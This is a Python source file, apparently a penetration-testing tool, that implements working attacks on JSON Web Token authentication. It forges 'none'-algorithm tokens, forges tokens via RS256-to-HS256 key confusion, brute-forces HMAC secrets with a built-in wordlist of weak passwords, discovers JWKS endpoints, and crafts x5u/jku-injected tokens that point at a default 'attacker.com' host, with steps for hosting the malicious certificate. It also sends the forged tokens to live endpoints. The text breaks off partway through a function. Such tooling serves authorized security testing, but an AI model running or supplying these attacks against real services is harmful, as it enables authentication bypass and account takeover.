"""
JWT (JSON Web Token) Attack Scanner - Enhanced Edition

Comprehensive JWT security testing including:
- Algorithm confusion attacks (none, HS256/RS256 confusion)
- Key confusion attacks with actual public key handling
- Weak secret brute forcing (parallel multiprocessing)
- HTTP endpoint testing with real requests
- JWKS discovery and analysis
- Token manipulation and claim tampering
- KID/JKU/X5U injection attacks
- Token expiration bypass
- Automated vulnerability assessment

Based on PortSwigger JWT research, auth0 security guidelines,
and real-world penetration testing methodologies.

Enhanced to meet production security testing requirements.
"""

import base64
import hashlib
import hmac
import json
import re
import time
import os
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple, Callable
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from multiprocessing import cpu_count
import threading

# Optional imports for advanced features
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


class JWTAttackType(Enum):
    """Types of JWT attacks."""
    NONE_ALGORITHM = "none_algorithm"
    ALG_CONFUSION = "algorithm_confusion"
    WEAK_SECRET = "weak_secret"
    KID_INJECTION = "kid_injection"
    JKU_INJECTION = "jku_injection"
    X5U_INJECTION = "x5u_injection"
    CLAIM_TAMPERING = "claim_tampering"
    SIGNATURE_STRIPPING = "signature_stripping"
    KEY_INJECTION = "key_injection"
    EXP_BYPASS = "expiration_bypass"
    EMBEDDED_JWT = "embedded_jwt"
    HEADER_INJECTION = "header_injection"


class Severity(Enum):
    """Vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class JWTAttackResult:
    """Result of a JWT attack attempt."""
    attack_type: JWTAttackType
    original_token: str
    modified_token: str
    description: str
    success: bool = False
    verified: bool = False  # Whether we actually tested via HTTP
    severity: str = "HIGH"
    evidence: str = ""
    exploitation_notes: str = ""
    http_response: Optional[Dict] = None


@dataclass
class HTTPTestResult:
    """Result of HTTP endpoint testing."""
    token: str
    accepted: bool
    status_code: int
    response_length: int
    response_snippet: str
    response_time: float
    headers: Dict[str, str] = field(default_factory=dict)
    error: Optional[str] = None


@dataclass
class JWKSInfo:
    """Information about a discovered JWKS endpoint."""
    url: str
    keys: List[Dict]
    public_keys_pem: List[str]
    key_ids: List[str]
    algorithms: List[str]
    vulnerabilities: List[str]


@dataclass
class AssessmentReport:
    """Comprehensive JWT security assessment report."""
    target_url: str
    token_analyzed: str
    header: Dict
    payload: Dict
    algorithm: str
    findings: List[Dict]
    critical_count: int
    high_count: int
    medium_count: int
    low_count: int
    verified_vulnerabilities: List[Dict]
    exploitation_paths: List[str]
    remediation: List[str]
    risk_score: float  # 0-10
    timestamp: float


class JWTTester:
    """
    HTTP-based JWT testing capability.

    Actually sends requests to test if modified tokens are accepted.
    """

    def __init__(
        self,
        target_url: str,
        jwt_header: str = "Authorization",
        jwt_prefix: str = "Bearer ",
        timeout: int = 10,
        verify_ssl: bool = True,
        proxy: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        additional_headers: Optional[Dict[str, str]] = None
    ):
        if not HAS_REQUESTS:
            raise ImportError("requests library required for HTTP testing. Install with: pip install requests")

        self.target_url = target_url
        self.jwt_header = jwt_header
        self.jwt_prefix = jwt_prefix
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.cookies = cookies or {}
        self.additional_headers = additional_headers or {}

        self.session = requests.Session()
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        # Baseline response for comparison
        self._baseline: Optional[HTTPTestResult] = None

    def set_baseline(self, valid_token: str) -> HTTPTestResult:
        """Establish baseline response with valid token."""
        self._baseline = self.test_token(valid_token)
        return self._baseline

    def test_token(self, token: str, method: str = "GET",
                   data: Optional[Dict] = None) -> HTTPTestResult:
        """
        Test if a token is accepted by the target endpoint.

        Args:
            token: JWT token to test
            method: HTTP method (GET, POST, etc.)
            data: Optional request body data

        Returns:
            HTTPTestResult with acceptance status
        """
        headers = {
            self.jwt_header: f"{self.jwt_prefix}{token}",
            **self.additional_headers
        }

        start_time = time.time()

        try:
            if method.upper() == "GET":
                resp = self.session.get(
                    self.target_url,
                    headers=headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
            elif method.upper() == "POST":
                resp = self.session.post(
                    self.target_url,
                    headers=headers,
                    cookies=self.cookies,
                    json=data,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
            else:
                resp = self.session.request(
                    method,
                    self.target_url,
                    headers=headers,
                    cookies=self.cookies,
                    json=data,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

            response_time = time.time() - start_time

            # Determine if token was accepted
            # 401/403 typically means rejected, but also check for auth error messages
            rejected_codes = {401, 403}
            rejected_keywords = ["unauthorized", "forbidden", "invalid token",
                               "jwt", "expired", "signature"]

            is_rejected = resp.status_code in rejected_codes
            if not is_rejected:
                # Check response body for rejection indicators
                body_lower = resp.text.lower()
                is_rejected = any(kw in body_lower for kw in rejected_keywords)

            return HTTPTestResult(
                token=token,
                accepted=not is_rejected,
                status_code=resp.status_code,
                response_length=len(resp.text),
                response_snippet=resp.text[:500] if resp.text else "",
                response_time=response_time,
                headers=dict(resp.headers)
            )

        except requests.exceptions.Timeout:
            return HTTPTestResult(
                token=token,
                accepted=False,
                status_code=0,
                response_length=0,
                response_snippet="",
                response_time=self.timeout,
                error="Request timeout"
            )
        except requests.exceptions.RequestException as e:
            return HTTPTestResult(
                token=token,
                accepted=False,
                status_code=0,
                response_length=0,
                response_snippet="",
                response_time=time.time() - start_time,
                error=str(e)
            )

    def test_tokens_batch(
        self,
        tokens: List[str],
        max_workers: int = 10,
        stop_on_success: bool = False
    ) -> List[HTTPTestResult]:
        """
        Test multiple tokens concurrently.

        Args:
            tokens: List of tokens to test
            max_workers: Number of concurrent threads
            stop_on_success: Stop testing after first accepted token

        Returns:
            List of HTTPTestResult for each token
        """
        results = []
        stop_flag = threading.Event()

        def test_with_flag(token: str) -> Optional[HTTPTestResult]:
            if stop_flag.is_set():
                return None
            result = self.test_token(token)
            if stop_on_success and result.accepted:
                stop_flag.set()
            return result

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(test_with_flag, t): t for t in tokens}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    if stop_on_success and result.accepted:
                        break

        return results

    def compare_to_baseline(self, result: HTTPTestResult) -> Dict[str, Any]:
        """Compare a test result to the baseline."""
        if not self._baseline:
            return {"error": "No baseline established"}

        return {
            "status_code_match": result.status_code == self._baseline.status_code,
            "length_diff": result.response_length - self._baseline.response_length,
            "length_ratio": result.response_length / max(self._baseline.response_length, 1),
            "time_diff": result.response_time - self._baseline.response_time,
            "likely_same_auth": (
                result.status_code == self._baseline.status_code and
                abs(result.response_length - self._baseline.response_length) < 100
            )
        }


class ParallelBruteForcer:
    """
    High-performance parallel brute forcing for JWT secrets.

    Uses multiprocessing for CPU-bound HMAC operations.
    """

    def __init__(self, processes: Optional[int] = None):
        self.processes = processes or cpu_count()

    @staticmethod
    def _check_secrets_chunk(
        message: str,
        target_sig_bytes: bytes,
        secrets: List[str],
        hash_func_name: str
    ) -> Optional[str]:
        """
        Check a chunk of secrets against target signature.

        This runs in a separate process.
        """
        if hash_func_name == "sha256":
            hash_func = hashlib.sha256
        elif hash_func_name == "sha384":
            hash_func = hashlib.sha384
        elif hash_func_name == "sha512":
            hash_func = hashlib.sha512
        else:
            return None

        for secret in secrets:
            computed = hmac.new(
                secret.encode(),
                message.encode(),
                hash_func
            ).digest()

            if computed == target_sig_bytes:
                return secret

        return None

    def brute_force(
        self,
        token: str,
        wordlist: Optional[List[str]] = None,
        wordlist_path: Optional[str] = None,
        callback: Optional[Callable[[int, int], None]] = None
    ) -> Optional[str]:
        """
        Parallel brute force attack on JWT secret.

        Args:
            token: JWT token to crack
            wordlist: List of secrets to try
            wordlist_path: Path to wordlist file
            callback: Progress callback(current, total)

        Returns:
            Discovered secret or None
        """
        parts = token.split('.')
        if len(parts) != 3:
            return None

        message = f"{parts[0]}.{parts[1]}"
        target_sig = parts[2]

        # Pad and decode signature
        target_sig_padded = target_sig + '=' * (4 - len(target_sig) % 4)
        try:
            target_sig_bytes = base64.urlsafe_b64decode(target_sig_padded)
        except Exception:
            return None

        # Determine hash function from signature length
        if len(target_sig_bytes) == 32:
            hash_func_name = "sha256"
        elif len(target_sig_bytes) == 48:
            hash_func_name = "sha384"
        elif len(target_sig_bytes) == 64:
            hash_func_name = "sha512"
        else:
            return None

        # Load wordlist
        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, 'r', errors='ignore') as f:
                wordlist = [line.strip() for line in f if line.strip()]
        elif not wordlist:
            # Default common passwords
            wordlist = self._get_default_wordlist()

        total = len(wordlist)

        # Split into chunks for parallel processing
        chunk_size = max(1, total // (self.processes * 4))
        chunks = [
            wordlist[i:i + chunk_size]
            for i in range(0, total, chunk_size)
        ]

        # Use ProcessPoolExecutor for CPU-bound work
        with ProcessPoolExecutor(max_workers=self.processes) as executor:
            futures = []
            for chunk in chunks:
                future = executor.submit(
                    self._check_secrets_chunk,
                    message,
                    target_sig_bytes,
                    chunk,
                    hash_func_name
                )
                futures.append(future)

            completed = 0
            for future in as_completed(futures):
                completed += 1
                if callback:
                    callback(completed * chunk_size, total)

                result = future.result()
                if result:
                    # Cancel remaining futures
                    for f in futures:
                        f.cancel()
                    return result

        return None

    def _get_default_wordlist(self) -> List[str]:
        """Get default wordlist for quick testing."""
        base_words = [
            "secret", "password", "123456", "admin", "key", "jwt", "token",
            "jwt_secret", "secretkey", "secret123", "password123", "test",
            "supersecret", "changeme", "dev", "development", "production",
            "your-256-bit-secret", "your-secret-key", "jwt-secret",
            "auth-secret", "api-secret", "app-secret", "mysecret", "mykey",
            "privatekey", "qwerty", "letmein", "welcome", "monkey", "dragon",
            "master", "login", "abc123", "passw0rd", "p@ssword", "admin123",
            "root", "toor", "administrator", "guest", "default", "public",
            "private", "internal", "external", "backend", "frontend", "api",
            "web", "mobile", "app", "application", "service", "microservice"
        ]

        # Add numbered variants
        extended = list(base_words)
        for word in base_words[:20]:
            for i in range(10):
                extended.append(f"{word}{i}")
            for i in range(2020, 2026):
                extended.append(f"{word}{i}")

        return extended


class JWKSAnalyzer:
    """
    JWKS (JSON Web Key Set) discovery and analysis.

    Finds and analyzes public keys from JWKS endpoints.
    """

    COMMON_JWKS_PATHS = [
        "/.well-known/jwks.json",
        "/jwks.json",
        "/.well-known/openid-configuration",
        "/oauth/discovery/keys",
        "/oauth2/keys",
        "/oauth2/v1/keys",
        "/v1/keys",
        "/.well-known/keys",
        "/api/keys",
        "/auth/keys",
        "/realms/master/protocol/openid-connect/certs",  # Keycloak
    ]

    def __init__(self, timeout: int = 10, verify_ssl: bool = True):
        if not HAS_REQUESTS:
            raise ImportError("requests library required")

        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()

    def discover_jwks(self, base_url: str) -> Optional[JWKSInfo]:
        """
        Discover and analyze JWKS endpoint.

        Args:
            base_url: Target base URL (e.g., https://api.example.com)

        Returns:
            JWKSInfo if found, None otherwise
        """
        # Normalize URL
        if not base_url.startswith(("http://", "https://")):
            base_url = f"https://{base_url}"
        base_url = base_url.rstrip("/")

        for path in self.COMMON_JWKS_PATHS:
            url = f"{base_url}{path}"

            try:
                resp = self.session.get(
                    url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                if resp.status_code != 200:
                    continue

                data = resp.json()

                # Check if it's an OpenID configuration
                if "jwks_uri" in data:
                    # Follow to actual JWKS
                    jwks_resp = self.session.get(
                        data["jwks_uri"],
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    if jwks_resp.status_code == 200:
                        data = jwks_resp.json()
                        url = data["jwks_uri"]

                # Parse JWKS
                if "keys" in data:
                    return self._parse_jwks(url, data)

            except Exception:
                continue

        return None

    def fetch_jwks(self, url: str) -> Optional[JWKSInfo]:
        """Fetch and parse JWKS from a specific URL."""
        try:
            resp = self.session.get(
                url,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if resp.status_code == 200:
                return self._parse_jwks(url, resp.json())
        except Exception:
            pass

        return None

    def _parse_jwks(self, url: str, data: Dict) -> JWKSInfo:
        """Parse JWKS data into structured format."""
        keys = data.get("keys", [])
        public_keys_pem = []
        key_ids = []
        algorithms = []
        vulnerabilities = []

        for key in keys:
            kid = key.get("kid", "")
            alg = key.get("alg", "")
            kty = key.get("kty", "")

            if kid:
                key_ids.append(kid)
            if alg:
                algorithms.append(alg)

            # Extract public key if RSA
            if kty == "RSA" and HAS_CRYPTO:
                try:
                    pem = self._jwk_to_pem(key)
                    if pem:
                        public_keys_pem.append(pem)
                except Exception:
                    pass

            # Check for vulnerabilities
            if not alg:
                vulnerabilities.append("Key missing algorithm specification")
            if key.get("use") != "sig":
                vulnerabilities.append(f"Key {kid} not explicitly marked for signatures")
            if "d" in key or "p" in key or "q" in key:
                vulnerabilities.append(f"CRITICAL: Private key material exposed in JWKS for {kid}")

        # Check for weak algorithms
        weak_algs = {"HS256", "HS384", "HS512", "none"}
        if any(a in weak_algs for a in algorithms):
            vulnerabilities.append("JWKS advertises symmetric algorithms (potential confusion attack)")

        return JWKSInfo(
            url=url,
            keys=keys,
            public_keys_pem=public_keys_pem,
            key_ids=key_ids,
            algorithms=list(set(algorithms)),
            vulnerabilities=vulnerabilities
        )

    def _jwk_to_pem(self, jwk: Dict) -> Optional[str]:
        """Convert JWK to PEM format."""
        if not HAS_CRYPTO:
            return None

        if jwk.get("kty") != "RSA":
            return None

        try:
            # Decode n and e
            n_b64 = jwk["n"]
            e_b64 = jwk["e"]

            # Add padding
            n_bytes = base64.urlsafe_b64decode(n_b64 + "==")
            e_bytes = base64.urlsafe_b64decode(e_b64 + "==")

            n = int.from_bytes(n_bytes, "big")
            e = int.from_bytes(e_bytes, "big")

            # Create public key
            public_numbers = RSAPublicNumbers(e, n)
            public_key = public_numbers.public_key(default_backend())

            # Convert to PEM
            pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode()

            return pem

        except Exception:
            return None


class RSAAttacker:
    """
    RSA-based JWT attacks.

    Includes algorithm confusion (RS256 -> HS256) and key injection.
    """

    def __init__(self):
        if not HAS_CRYPTO:
            raise ImportError("cryptography library required for RSA attacks")

    def algorithm_confusion_attack(
        self,
        token: str,
        public_key_pem: str
    ) -> str:
        """
        Perform RS256 to HS256 algorithm confusion attack.

        Uses the public key as an HMAC secret to forge tokens.

        Args:
            token: Original RS256 signed token
            public_key_pem: Public key in PEM format

        Returns:
            Forged token signed with public key as HMAC secret
        """
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")

        # Decode header and payload
        header_b64 = parts[0]
        payload_b64 = parts[1]

        header_json = base64.urlsafe_b64decode(header_b64 + "==")
        header = json.loads(header_json)

        # Change algorithm to HS256
        header["alg"] = "HS256"

        # Re-encode header
        new_header_json = json.dumps(header, separators=(',', ':'))
        new_header_b64 = base64.urlsafe_b64encode(
            new_header_json.encode()
        ).rstrip(b'=').decode()

        # Create message
        message = f"{new_header_b64}.{payload_b64}"

        # Sign with public key as HMAC secret
        # The key should be used as-is (including PEM headers)
        signature = hmac.new(
            public_key_pem.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()

        signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

        return f"{new_header_b64}.{payload_b64}.{signature_b64}"

    def algorithm_confusion_variants(
        self,
        token: str,
        public_key_pem: str
    ) -> List[Dict[str, str]]:
        """
        Generate multiple algorithm confusion variants.

        Some servers may accept different key formats.
        """
        variants = []

        # Variant 1: Full PEM with headers
        try:
            forged = self.algorithm_confusion_attack(token, public_key_pem)
            variants.append({
                "token": forged,
                "key_format": "full_pem",
                "description": "Public key with PEM headers"
            })
        except Exception:
            pass

        # Variant 2: PEM without headers
        try:
            key_body = public_key_pem.replace("-----BEGIN PUBLIC KEY-----", "")
            key_body = key_body.replace("-----END PUBLIC KEY-----", "")
            key_body = key_body.replace("\n", "").strip()

            forged = self._sign_hs256(token, key_body)
            variants.append({
                "token": forged,
                "key_format": "base64_only",
                "description": "Public key without PEM headers"
            })
        except Exception:
            pass

        # Variant 3: Raw DER bytes as hex
        try:
            key_body = public_key_pem.replace("-----BEGIN PUBLIC KEY-----", "")
            key_body = key_body.replace("-----END PUBLIC KEY-----", "")
            key_body = key_body.replace("\n", "").strip()
            der_bytes = base64.b64decode(key_body)

            forged = self._sign_hs256(token, der_bytes.hex())
            variants.append({
                "token": forged,
                "key_format": "der_hex",
                "description": "DER encoded key as hex string"
            })
        except Exception:
            pass

        return variants

    def _sign_hs256(self, token: str, secret: str) -> str:
        """Sign token with HS256 using given secret."""
        parts = token.split('.')
        header_json = base64.urlsafe_b64decode(parts[0] + "==")
        header = json.loads(header_json)
        header["alg"] = "HS256"

        new_header_json = json.dumps(header, separators=(',', ':'))
        new_header_b64 = base64.urlsafe_b64encode(
            new_header_json.encode()
        ).rstrip(b'=').decode()

        message = f"{new_header_b64}.{parts[1]}"
        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()

        signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        return f"{new_header_b64}.{parts[1]}.{signature_b64}"

    def generate_key_pair(self) -> Tuple[str, str]:
        """
        Generate RSA key pair for attacks.

        Returns:
            Tuple of (private_key_pem, public_key_pem)
        """
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )

        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()

        public_pem = private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()

        return private_pem, public_pem

    def sign_rs256(self, header: Dict, payload: Dict, private_key_pem: str) -> str:
        """
        Sign a JWT with RS256.

        Used for JKU/X5U injection attacks.
        """
        from cryptography.hazmat.primitives.asymmetric import padding as asym_padding

        # Load private key
        private_key = serialization.load_pem_private_key(
            private_key_pem.encode(),
            password=None,
            backend=default_backend()
        )

        # Encode header and payload
        header_json = json.dumps(header, separators=(',', ':'))
        header_b64 = base64.urlsafe_b64encode(
            header_json.encode()
        ).rstrip(b'=').decode()

        payload_json = json.dumps(payload, separators=(',', ':'))
        payload_b64 = base64.urlsafe_b64encode(
            payload_json.encode()
        ).rstrip(b'=').decode()

        message = f"{header_b64}.{payload_b64}"

        # Sign
        signature = private_key.sign(
            message.encode(),
            asym_padding.PKCS1v15(),
            hashes.SHA256()
        )

        signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

        return f"{header_b64}.{payload_b64}.{signature_b64}"

    def public_key_to_jwk(self, public_key_pem: str, kid: str = "attacker-key") -> Dict:
        """Convert public key PEM to JWK format."""
        public_key = serialization.load_pem_public_key(
            public_key_pem.encode(),
            backend=default_backend()
        )

        public_numbers = public_key.public_numbers()

        # Convert to bytes
        n_bytes = public_numbers.n.to_bytes(
            (public_numbers.n.bit_length() + 7) // 8, 'big'
        )
        e_bytes = public_numbers.e.to_bytes(
            (public_numbers.e.bit_length() + 7) // 8, 'big'
        )

        # Base64url encode
        n_b64 = base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode()
        e_b64 = base64.urlsafe_b64encode(e_bytes).rstrip(b'=').decode()

        return {
            "kty": "RSA",
            "kid": kid,
            "use": "sig",
            "alg": "RS256",
            "n": n_b64,
            "e": e_b64
        }


class X5UAttacker:
    """
    X5U (X.509 URL) header injection attacks.

    Generate malicious certificates and tokens with X5U pointing
    to attacker-controlled URLs.
    """

    def __init__(self, callback_host: str):
        if not HAS_CRYPTO:
            raise ImportError("cryptography library required")

        self.callback_host = callback_host

    def generate_malicious_cert_chain(self, cn: str = "attacker.com") -> Dict:
        """
        Generate self-signed certificate and key for X5U attack.

        Returns:
            Dict with cert_pem, key_pem, and cert_der_b64
        """
        from datetime import datetime, timedelta

        # Generate key pair
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )

        # Generate self-signed certificate
        subject = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, cn),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Security Test"),
        ])

        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(subject)
            .public_key(private_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.utcnow())
            .not_valid_after(datetime.utcnow() + timedelta(days=365))
            .sign(private_key, hashes.SHA256(), default_backend())
        )

        # Export
        cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
        cert_der = cert.public_bytes(serialization.Encoding.DER)
        cert_der_b64 = base64.b64encode(cert_der).decode()

        key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()

        public_key_pem = private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()

        return {
            "cert_pem": cert_pem,
            "cert_der_b64": cert_der_b64,
            "private_key_pem": key_pem,
            "public_key_pem": public_key_pem
        }

    def craft_x5u_token(self, payload: Dict, path: str = "/certs/chain.pem") -> Dict:
        """
        Generate token with malicious X5U header.

        Args:
            payload: JWT payload claims
            path: Path on callback host for cert chain

        Returns:
            Dict with token, certificate, and hosting instructions
        """
        # Generate certificate
        cert_data = self.generate_malicious_cert_chain()

        # Create RSA attacker for signing
        rsa_attacker = RSAAttacker()

        # Create header with X5U
        x5u_url = f"https://{self.callback_host}{path}"
        header = {
            "alg": "RS256",
            "typ": "JWT",
            "x5u": x5u_url
        }

        # Sign with our private key
        token = rsa_attacker.sign_rs256(
            header,
            payload,
            cert_data["private_key_pem"]
        )

        return {
            "token": token,
            "x5u_url": x5u_url,
            "cert_to_host": cert_data["cert_pem"],
            "private_key": cert_data["private_key_pem"],
            "instructions": [
                f"1. Host the certificate at {x5u_url}",
                "2. Ensure the URL is accessible from the target server",
                "3. The server will fetch the cert to verify the signature",
                "4. Since we signed with our key, verification will succeed"
            ],
            "exploitation": "If the server fetches X5U without validation, token is accepted"
        }


class JWTScanner:
    """
    Advanced JWT security scanner - Enhanced Edition.

    Features:
    - Algorithm manipulation attacks
    - Weak secret detection with parallel brute forcing
    - Header injection attacks (kid, jku, x5u)
    - HTTP endpoint testing
    - JWKS discovery and analysis
    - Claim tampering
    - Token forgery
    - Signature bypass techniques
    - Automated vulnerability assessment
    """

    def __init__(self, callback_host: str = None):
        self.callback_host = callback_host or "attacker.com"
        self.findings: List[JWTAttackResult] = []

        # Initialize sub-components
        self.brute_forcer = ParallelBruteForcer()
        self.jwks_analyzer = JWKSAnalyzer() if HAS_REQUESTS else None
        self.rsa_attacker = RSAAttacker() if HAS_CRYPTO else None
        self.x5u_attacker = X5UAttacker(self.callback_host) if HAS_CRYPTO else None

        # Common weak secrets for brute forcing
        self.weak_secrets = [
            "secret", "password", "123456", "admin", "key",
            "jwt_secret", "secretkey", "secret123", "password123",
            "supersecret", "changeme", "test", "dev", "development",
            "production", "your-256-bit-secret", "your-secret-key",
            "jwt-secret", "auth-secret", "api-secret", "app-secret",
            "mysecret", "mykey", "privatekey", "qwerty", "letmein",
            "welcome", "monkey", "dragon", "master", "login",
        ]

        # Extended wordlist for thorough testing
        self.extended_secrets = self.weak_secrets + [
            f"secret{i}" for i in range(100)
        ] + [
            f"password{i}" for i in range(100)
        ] + [
            f"key{i}" for i in range(100)
        ]

    def decode_token(self, token: str) -> Tuple[Dict, Dict, str]:
        """
        Decode JWT token into header, payload, and signature.

        Args:
            token: JWT token string

        Returns:
            Tuple of (header_dict, payload_dict, signature_base64)
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format")

            # Decode header
            header_b64 = parts[0]
            header_json = base64.urlsafe_b64decode(
                header_b64 + '=' * (4 - len(header_b64) % 4)
            )
            header = json.loads(header_json)

            # Decode payload
            payload_b64 = parts[1]
            payload_json = base64.urlsafe_b64decode(
                payload_b64 + '=' * (4 - len(payload_b64) % 4)
            )
            payload = json.loads(payload_json)

            return header, payload, parts[2]

        except Exception as e:
            raise ValueError(f"Failed to decode JWT: {e}")

    def encode_token(self, header: Dict, payload: Dict,
                     secret: str = "", algorithm: str = "HS256") -> str:
        """
        Encode JWT token with specified parameters.

        Args:
            header: JWT header dictionary
            payload: JWT payload dictionary
            secret: Signing secret (empty for none algorithm)
            algorithm: Signing algorithm

        Returns:
            Encoded JWT token string
        """
        # Encode header
        header_json = json.dumps(header, separators=(',', ':'))
        header_b64 = base64.urlsafe_b64encode(
            header_json.encode()
        ).rstrip(b'=').decode()

        # Encode payload
        payload_json = json.dumps(payload, separators=(',', ':'))
        payload_b64 = base64.urlsafe_b64encode(
            payload_json.encode()
        ).rstrip(b'=').decode()

        # Create signature
        message = f"{header_b64}.{payload_b64}"

        if algorithm.lower() == "none" or not secret:
            signature_b64 = ""
        elif algorithm == "HS256":
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        elif algorithm == "HS384":
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha384
            ).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        elif algorithm == "HS512":
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha512
            ).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        else:
            # For RS256/RS384/RS512, use RSAAttacker if available
            if self.rsa_attacker and secret:
                # Assume secret is private key PEM
                return self.rsa_attacker.sign_rs256(header, payload, secret)
            signature_b64 = ""

        return f"{header_b64}.{payload_b64}.{signature_b64}"

    def scan_token(self, token: str, target_url: str = None) -> List[Dict]:
        """
        Perform comprehensive JWT security scan.

        Args:
            token: JWT token to analyze
            target_url: Optional URL for HTTP testing

        Returns:
            List of attack findings
        """
        findings = []

        try:
            header, payload, signature = self.decode_token(token)
        except ValueError as e:
            return [{"error": str(e), "type": "parse_error"}]

        # Initialize HTTP tester if URL provided
        http_tester = None
        if target_url and HAS_REQUESTS:
            http_tester = JWTTester(target_url)
            try:
                http_tester.set_baseline(token)
            except Exception:
                pass

        # 1. None algorithm attack
        none_result = self._test_none_algorithm(header, payload, token, http_tester)
        if none_result:
            findings.append(none_result)

        # 2. Algorithm confusion (RS256 to HS256)
        if header.get("alg", "").startswith("RS"):
            confusion_result = self._test_algorithm_confusion(
                header, payload, token, target_url, http_tester
            )
            if confusion_result:
                findings.append(confusion_result)

        # 3. Weak secret brute force (for HMAC algorithms)
        if header.get("alg", "").startswith("HS"):
            weak_result = self._test_weak_secret(token, http_tester)
            if weak_result:
                findings.append(weak_result)

        # 4. KID injection
        kid_result = self._test_kid_injection(header, payload, token, http_tester)
        if kid_result:
            findings.append(kid_result)

        # 5. JKU injection
        jku_result = self._test_jku_injection(header, payload, token)
        if jku_result:
            findings.append(jku_result)

        # 6. X5U injection
        x5u_result = self._test_x5u_injection(header, payload, token)
        if x5u_result:
            findings.append(x5u_result)

        # 7. Claim tampering variants
        claim_results = self._generate_claim_tampers(header, payload, token)
        findings.extend(claim_results)

        # 8. Expiration bypass
        exp_result = self._test_exp_bypass(header, payload, token)
        if exp_result:
            findings.append(exp_result)

        # 9. Signature stripping
        strip_result = self._test_signature_stripping(header, payload, token, http_tester)
        if strip_result:
            findings.append(strip_result)

        # 10. Embedded JWT attack
        embedded_result = self._test_embedded_jwt(header, payload, token)
        if embedded_result:
            findings.append(embedded_result)

        return findings

    def _test_none_algorithm(
        self,
        header: Dict,
        payload: Dict,
        original_token: str,
        http_tester: Optional[JWTTester] = None
    ) -> Optional[Dict]:
        """Test 'none' algorithm vulnerability."""
        none_header = header.copy()
        none_variants = ["none", "None", "NONE", "nOnE", "NoNe"]

        tokens = []
        for variant in none_variants:
            none_header["alg"] = variant
            token = self.encode_token(none_header, payload, "", "none")
            tokens.append(token)
            tokens.append(token.rstrip('.'))

        # Test via HTTP if available
        verified_vulnerable = False
        accepted_token = None

        if http_tester:
            results = http_tester.test_tokens_batch(tokens, stop_on_success=True)
            for result in results:
                if result.accepted:
                    verified_vulnerable = True
                    accepted_token = result.token
                    break

        return {
            "attack_type": JWTAttackType.NONE_ALGORITHM.value,
            "original_token": original_token,
            "modified_tokens": tokens,
            "description": "JWT with 'none' algorithm - signature verification bypassed",
            "severity": Severity.CRITICAL.value,
            "verified": verified_vulnerable,
            "accepted_token": accepted_token,
            "test_instruction": "Submit these tokens and check if they're accepted",
            "exploitation": "If accepted, you can forge tokens with any claims",
            "remediation": "Explicitly reject 'none' algorithm in JWT validation",
        }

    def _test_algorithm_confusion(
        self,
        header: Dict,
        payload: Dict,
        original_token: str,
        target_url: str = None,
        http_tester: Optional[JWTTester] = None
    ) -> Optional[Dict]:
        """Test RS256 to HS256 algorithm confusion."""
        if not header.get("alg", "").startswith("RS"):
            return None

        result = {
